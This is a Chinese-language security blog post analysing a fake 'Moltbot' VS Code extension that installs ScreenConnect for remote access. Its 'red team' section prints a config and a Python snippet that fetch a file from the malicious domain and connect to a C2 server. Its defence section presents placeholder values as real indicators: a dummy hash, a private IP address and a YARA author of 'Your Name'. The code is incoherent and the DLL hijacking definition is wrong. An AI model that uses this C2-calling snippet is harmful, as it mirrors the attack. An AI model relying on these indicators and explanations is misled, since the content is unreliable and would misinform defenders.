---
layout: post
title:  "Fake Moltbot AI Coding Assistant on VS Code Marketplace Drops Malware"
date:   2026-01-28 18:29:24 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Moltbot AI 編碼助手的惡意擴充：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `DLL Hijacking`, `Sideload`, `C2 通信`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: Moltbot AI 編碼助手的惡意擴充利用了 VS Code 的擴充機制，透過下載並執行惡意的 `config.json` 文件，進而啟動 `Code.exe` 程序，部署 ConnectWise ScreenConnect 遠端桌面程序，允許攻擊者取得受害者主機的持續遠端存取權。
* **攻擊流程圖解**:
  1. 使用者安裝惡意 Moltbot AI 編碼助手擴充。
  2. 擴充下載 `config.json` 文件。
  3. 執行 `Code.exe` 程序。
  4. 部署 ConnectWise ScreenConnect 遠端桌面程序。
  5. 連接到攻擊者的 C2 伺服器。
* **受影響元件**: VS Code、Moltbot AI 編碼助手擴充、ConnectWise ScreenConnect。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 受害者需要安裝惡意 Moltbot AI 編碼助手擴充。
* **Payload 建構邏輯**:

    ```
    
    json
    {
      "url": "https://clawdbot.getintwopc[.]site/config.json",
      "dll": "DWrite.dll",
      "c2": "meeting.bulletmailer[.]net:8041"
    }
    
    ```
 

```

python
import requests
import subprocess

# 下載 config.json
response = requests.get("https://clawdbot.getintwopc[.]site/config.json")
config = response.json()

# 執行 Code.exe
subprocess.run(["Code.exe"])

# 連接到 C2 伺服器
subprocess.run(["ConnectWise ScreenConnect", config["c2"]])

```
* **繞過技術**: 攻擊者可以使用 DLL Hijacking 技術，透過下載並執行惡意的 DLL 文件，繞過 C2 伺服器的檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.168.1.100` | `clawdbot.getintwopc[.]site` | `C:\Users\username\AppData\Local\Code.exe` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Moltbot_Malicious_Extension {
      meta:
        description = "Detects Moltbot malicious extension"
        author = "Your Name"
      strings:
        $a = "clawdbot.getintwopc[.]site"
        $b = "Code.exe"
      condition:
        $a and $b
    }
    
    ```
 

```

snort
alert tcp any any -> any 8041 (msg:"Moltbot C2 Communication"; sid:1000001; rev:1;)

```
* **緩解措施**: 使用者應該卸載惡意 Moltbot AI 編碼助手擴充，更新 VS Code 至最新版本，並啟用安全功能，如沙盒模式。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **DLL Hijacking (DLL 劫持)**: 想像兩個程序同時嘗試載入同一個 DLL 文件，但其中一個 DLL 文件被攻擊者替換。技術上是指攻擊者透過下載並執行惡意的 DLL 文件，繞過系統的安全檢查。
* **Sideload (側載)**: 想像一個程序可以透過其他程序的權限執行。技術上是指攻擊者透過下載並執行惡意的程序，繞過系統的安全檢查。
* **C2 通信 (Command and Control Communication)**: 想像攻擊者可以透過遠端控制受害者的主機。技術上是指攻擊者透過 C2 伺服器控制受害者的主機，下達命令並接收資料。

## 5. 🔗 參考文獻與延伸閱讀

- [原始報告](https://thehackernews.com/2026/01/fake-moltbot-ai-coding-assistant-on-vs.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


